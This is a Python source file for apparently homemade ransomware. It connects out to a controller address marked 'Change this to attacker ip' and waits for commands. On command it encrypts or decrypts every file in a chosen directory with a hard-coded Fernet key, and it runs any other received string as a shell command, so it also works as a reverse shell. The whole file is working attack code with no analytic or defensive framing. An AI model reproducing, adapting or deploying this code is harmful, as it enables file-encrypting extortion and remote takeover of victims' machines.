from cryptography.fernet import Fernet
import os
from binaryornot.check import is_binary
import socket
import subprocess


def establish_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(('localhost', 4444)) # Change this to attacker ip
        return s
    except Exception as e:
        print("Error:", e)
        return None


def load_key():
    """
    Loads the key from the current directory named `key.key`
    """
    return b"C-0hJMh41fFzkF4irreRgz985hLRCXqQCdyW4bdFxBA="


from cryptography.fernet import Fernet
import os

def encrypt_file(file_directory, key):
    """
    Encrypts files in the given directory, excluding certain files.
    """
    fernet = Fernet(key)
    for filename in os.listdir(file_directory):
        file_path = os.path.join(file_directory, filename)
        # Skip specific files
        if filename in ["key.key", "ransomeware.py"]:
            continue
        try:
            with open(file_path, "rb") as file:
                file_data = file.read()
            encrypted_data = fernet.encrypt(file_data)
            with open(file_path, "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
    return 'Encrypted'

def decrypt_file(file_directory, key):
    """
    Decrypts files in the given directory, excluding certain files.
    """
    fernet = Fernet(key)
    for filename in os.listdir(file_directory):
        file_path = os.path.join(file_directory, filename)
        if filename in ["key.key", "ransomeware.py"]:
            continue
        try:
            with open(file_path, "rb") as encrypted_file:
                encrypted_data = encrypted_file.read()
            decrypted_data = fernet.decrypt(encrypted_data)
            with open(file_path, "wb") as decrypted_file:
                decrypted_file.write(decrypted_data)
        except Exception as e:
            print(f"Error decrypting {file_path}: {e}")
    return 'Decrypted'


def help_menu():
    menu = """help --> For help Menu
 encrypt --> For encryption
 decrypt --> For decryption
 set directory directory_absolute_path --> set Directory to encrypt or decrypt
 show directory --> print directory name"""
    return menu




key = load_key()
s = establish_connection()

if s:
    print("Connected")
    file_directory = os.getcwd()
    i = 0
    while True:
        if i == 0:
            output = help_menu()
            s.send(output.encode())
        else:
            cmd = s.recv(1024).decode()
            if cmd == 'encrypt':
                output = encrypt_file(file_directory, key)
            elif cmd == 'decrypt':
                output = decrypt_file(file_directory, key)
            elif cmd == 'help':
                output = help_menu()
            elif cmd == "show directory":
                output = "Directory ---> " + file_directory
            elif 'set directory' in cmd:
                file_directory = cmd.split(' ', 2)[2]  # Correctly split and get directory path
                output = "Directory set to " + file_directory
            else:
                output = subprocess.getoutput(cmd)

            s.send(output.encode())
            if cmd == "exit":
                print("Connection closed")
                break
        i += 1
    s.close()
